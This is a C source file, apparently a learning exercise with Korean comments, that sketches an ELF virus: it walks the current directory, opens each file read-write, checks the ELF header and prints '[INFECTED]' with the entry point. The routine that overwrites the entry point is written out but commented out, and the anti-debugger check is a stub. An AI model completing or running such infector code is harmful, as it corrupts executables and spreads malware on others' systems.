#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <ftw.h>
#include <string.h>
#include <stdlib.h>
#include <elf.h>
#include <fcntl.h>

#define ROOT_DIR   (".")
#define SPARE_FDS  (4)
#define MAX_FDS    (512)

void infect(const char* fpath){
    printf("%s will be infected.\n", fpath);
}

int activate(){
    return 1; // 
}

void change_entrypoint(const char* fpath, char *newaddr){
	int fd;
	//Elf32_Ehdr ehdr;
	Elf64_Ehdr ehdr; // Assuming 64-bit ELF file.
	
	if(access(fpath,R_OK|W_OK|X_OK)!=0){ // 성공하면 0, 실패하면 -1
		printf("Permission error! : %s\n",fpath);
		//exit(1);
	}
	if(!activate()){
		printf("Debugger detected!\n");
		//exit(1);
	}
	fd = open(fpath, O_RDWR); // readable, writable 하게 열어야 하는데... 
	if (fd < 0){
		printf("fd error\n");
		//exit(1); 
	}
	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)){
		printf("read error\n");
		//exit(1); 
	}
	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F')){ //elf가 아니라면
		printf("%s is not ELF! it is %s!\n",fpath,ehdr.e_ident);
		//exit(1);
	}
	printf("[INFECTED] Entry point (%s): 0x%x\n\n\n", fpath, ehdr.e_entry);
	
	
	// Entry point overwriting routine.. Don't touch it!
	/*
	ehdr.e_entry = strtol(newaddr, NULL, 16); // change ehdr struct
	lseek(fd, 0, SEEK_SET);
	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); //write 실패

	printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
	*/
	
	// exit(0);
}

int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
    int ret = 0;
    if (flag == FTW_F && activate()) 
		change_entrypoint(fpath, "0x11111111");
        
    return ret;
}

int main(int argc, char* argv[])
{
    struct timeval t;
    int nfds = getdtablesize() - SPARE_FDS;
    nfds = nfds > MAX_FDS ? MAX_FDS : nfds;

    gettimeofday(&t, NULL);
    srand(t.tv_usec * t.tv_sec);
    nftw(ROOT_DIR, file_process, nfds, FTW_PHYS);
    exit(0);
}



